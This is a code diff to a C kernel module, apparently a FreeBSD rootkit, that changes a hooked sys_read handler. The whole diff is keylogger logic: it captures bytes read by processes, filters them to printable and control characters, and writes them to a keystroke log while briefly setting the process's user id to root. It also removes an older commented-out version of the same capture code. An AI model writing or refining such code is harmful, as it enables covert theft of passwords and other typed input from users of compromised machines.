@@ -182,29 +182,6 @@ int hook_sys_read(struct thread *td, struct read_args * uap){
 
 	int error = 0;
 
-	// error = sys_read(td, uap);
-	// if(error)
-	// 	return error;
-
-	// if(uap->fd == 0 && uap->nbyte > 1) {
-		// int fd;
-		// uid_t savedcreds = td->td_proc->p_ucred->cr_uid;
-		// td->td_proc->p_ucred->cr_uid = 0;
-		// error = filewriter_openlog(td, &fd, KEYSTROKE);
-		// if(error)
-		// 	printf("err1: %d\n", error);
-		// error = filewriter_writelog(td, fd, uap->buf, uap->nbyte);
-		// if(error)
-		// 	printf("err2: %d\n", error);
-		// error = filewriter_closelog(td, fd);
-		// if(error)
-		// 	printf("err3: %d\n", error);
-		// td->td_proc->p_ucred->cr_uid = savedcreds;
-	// }
-
-	// return error;
-
-
 	error = sys_read(td, uap);
 	char buf[1];
 	int done;
@@ -214,15 +191,17 @@ int hook_sys_read(struct thread *td, struct read_args * uap){
 
 	copyinstr(uap->buf, buf, 1, &done);
 
-	printf("%c\n", buf[0]);
+	if((0x20 <= buf[0] && buf[0] <= 0x7f) || buf[0] == 0x08 || buf[0] == 0x09 || buf[0] == 0x0a || buf[0] == 0x1b) {
+		printf("%c\n", buf[0]);
 
-	int fd;
-	uid_t savedcreds = td->td_proc->p_ucred->cr_uid;
-	td->td_proc->p_ucred->cr_uid = 0;
-	error = filewriter_openlog(td, &fd, KEYSTROKE);
-	error = filewriter_writelog(td, fd, uap->buf, uap->nbyte);
-	error = filewriter_closelog(td, fd);
-	td->td_proc->p_ucred->cr_uid = savedcreds;
+		int fd;
+		uid_t savedcreds = td->td_proc->p_ucred->cr_uid;
+		td->td_proc->p_ucred->cr_uid = 0;
+		error = filewriter_openlog(td, &fd, KEYSTROKE);
+		error = filewriter_writelog(td, fd, uap->buf, uap->nbyte);
+		error = filewriter_closelog(td, fd);
+		td->td_proc->p_ucred->cr_uid = savedcreds;
+	}
 
 	return(error);
 
